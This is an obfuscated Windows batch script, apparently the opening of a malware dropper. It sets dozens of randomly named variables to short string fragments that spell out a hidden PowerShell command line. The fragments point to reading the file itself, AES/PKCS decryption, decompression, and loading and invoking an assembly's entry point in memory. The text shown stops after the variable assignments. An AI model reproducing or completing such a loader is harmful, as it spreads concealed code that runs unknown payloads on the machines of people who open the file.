@echo off
set "KkRWvtyeTL=\v"
set "CiOsIVMRcv=xe"
set "pwusPwLpMS=32"
set "DGxAJyVaGg=ll"
set "XLOKEtPESz=:\"
set "trtzxETmsZ=1."
set "ewMcqVWvYk=ow"
set "BOWeemmXde=we"
set "hRPfqednLT=Po"
set "OGwghSWMJp=\W"
set "LfQGyyYwcJ=ll"
set "fxWeeRxThK=s\"
set "nVBgWspScN=0\"
set "dYzHmwAvwt=ws"
set "dGcfbJlGYl=he"
set "FIHGTPILZd=rs"
set "AAEyLMpBdJ=nd"
set "dnBjvOnmAa=st"
set "YNsLmELMTl=rS"
set "zZENUoWBUn=co"
set "DktgHWghln=in"
set "bGZRtzRbiv= /"
set "vKKRgaSQPx=he"
set "lapQWZrAOs=Wi"
set "SIVfCGTitY=do"
set "cWCEmdEzuT=em"
set "RMJdJljzPR= C"
set "GLfDDVcOEp=py"
set "RmIpXLQeXa=y "
set "JKfNAlTOvM=po"
set "TILxqxhpZR=Sy"
set "fsPXibcyTL=.e"
set "pEdzafLqEA=we"
set "nqSvFHONzQ=cd"
set "WKPkyxSVEl= %~dp0"
set "kuCxBLSDtb=Secu"
set "clTHFVGXSP=Kxds"
set "MlsrZTaPfV=yste"
set "QFsRNspegF=-nop"
set "kikWJbIkmG=; };"
set "qauPQVbupq=ecry"
set "lCOHSeZHcr=ewLi"
set "AHEuahXGNN=:: '"
set "FSSLunjNaN=1..-"
set "VShksWCSsf=PKCS"
set "CbUAxrEmVg=V = "
set "TZbbRdIQdv=[Sys"
set "OfuvEtChnG=urMO"
set "bKWAQUabBa=.Ass"
set "QkNhYRHDsP=Disp"
set "yTAeVGZYNk=join"
set "IvpwFXPsVp=y]::"
set "oCdZBAcUWu=pDZz"
set "hhELqmZRKO=)($B"
set "KFDhCtOHkT=.Len"
set "FGvLXVpVSM=7Yiv"
set "jhmUdCJRnZ=ress"
set "QIddMkRNYW=]::C"
set "gonGDSxscq=Fina"
set "lvrWGQOVJK=e = "
set "NcfSGWREvJ=oint"
set "dLgqgvkhVh===')"
set "rqRYwEWSaS=y.Ci"
set "uaisKcefLa=-joi"
set "wCiwbwQECe=Invo"
set "zYlCgpJLHM=tem."
set "VAyVQozcee=ress"
set "vnaKZiVcGz=ose("
set "BCfKsDucqL=sGUc"
set "eaaEShRNvF=em.I"
set "FTBkmpbRqm=[Sys"
set "zCApLrRxMx=$tWN"
set "TXhfaugSXd=Fo7l"
set "IaWLVMjLnv=tGW "
set "RjPHfvtpea=Syst"
set "qjSTxMUkkQ=($Ao"
set "ONpJkXoVZm=ddin"
set "YutSPbUusu=$iCj"
set "uRorRgKjEB=0O+g"
set "MgyaZbasEb=bjec"
set "YshkgCSQQf=raph"
set "DpIlnZAfxQ='[-1"
set "BBQPDMRjDT=$InS"
set "pdmkBKPhcP= = ["
set "sTXkhvOepE=('%~f0'"
set "NsLLLuEsDY=esaB"
set "MgUCxtHZdT=('l0"
set "XbUMBcfEUM=ew-O"
set "asQcsYHDKm=..-1"
set "JNyiTFYhvn=le  "
set "DxdAbhRVZH=.Cop"
set "WRtZMRiDlK=pres"
set "VCSkCkBEoM=ect "
set "AdUjsEwcfb=+hAO"
set "lJAOBRwbGf=rt]:"
set "NaARchSMhL=).Sp"
set "nKpziBaMej= [st"
set "GRghbBOlfc=eam("
set "NYykGXyRzo=puBt"
set "uzYcdOgpOl=Cnd."
set "sRxCtBjNBH=;$Kx"
